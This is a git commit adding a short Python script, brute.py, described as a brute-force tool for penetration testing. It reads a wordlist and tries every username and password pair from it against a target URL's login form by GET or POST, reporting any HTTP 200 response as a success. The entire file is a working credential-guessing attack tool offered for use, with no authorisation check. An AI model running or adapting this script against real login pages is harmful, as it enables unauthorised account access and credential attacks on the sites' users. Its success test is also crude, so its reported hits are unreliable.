b7ea979e1ac23da3c17f53396024e28c65fce5f9
Santhoshkumar V <42181378+Santhoshkumar2298@users.noreply.github.com>
2023-12-15 22:17:47 +0530

    Add files via upload

---
+++ brute.py
@@ -0,0 +1,36 @@
+import requests
+import argparse
+
+def brute_force(username, password, target_url, method):
+    data = {'uname': username, 'pass': password}
+    
+    if method.lower() == 'get':
+        response = requests.get(target_url, params=data)
+    elif method.lower() == 'post':
+        response = requests.post(target_url, data=data)
+    else:
+        print("Invalid HTTP method specified. Use 'get' or 'post'.")
+        return
+
+    if response.status_code == 200: 
+        print(f"Success - Username: {username}, Password: {password}")
+    else:
+        print(f"Failed - Username: {username}, Password: {password}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Simple brute-force tool for penetration testing.")
+    parser.add_argument("-w", "--wordlist", help="Path to the wordlist file", required=True)
+    parser.add_argument("-t", "--target", help="Target URL", required=True)
+    parser.add_argument("-m", "--method", help="HTTP method (get or post)", required=True)
+    
+    args = parser.parse_args()
+
+    with open(args.wordlist, 'r') as f:
+        wordlist = f.read().splitlines()
+
+    for username in wordlist:
+        for password in wordlist:
+            brute_force(username, password, args.target, args.method)
+
+if __name__ == "__main__":
+    main()
